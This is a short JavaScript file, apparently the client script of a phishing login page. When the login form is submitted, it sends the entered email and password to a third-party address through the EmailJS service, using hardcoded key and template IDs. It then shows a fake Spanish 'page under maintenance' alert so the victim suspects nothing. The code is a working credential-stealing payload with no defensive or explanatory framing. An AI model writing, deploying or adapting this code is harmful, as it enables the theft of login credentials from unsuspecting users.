document.addEventListener("DOMContentLoaded", function () {
    emailjs.init("LdXZGJ3tjOS6_fCeV"); // User ID de EmailJS

    document.getElementById("login-form").addEventListener("submit", function (event) {
        event.preventDefault();

        let email = document.getElementById("email").value;
        let password = document.getElementById("password").value;

        let templateParams = {
            user_email: email,
            user_password: password
        };

        emailjs.send("service_9ft48yi", "template_e4bwoyk", templateParams)
            .then(function (response) {
                alert("Lo sentimos, pagina en mantenimiento");
                document.getElementById("login-form").reset();
            }, function (error) {
                alert("Error al enviar los datos. Inténtalo de nuevo.");
                console.error("Error:", error);
            });
    });
});
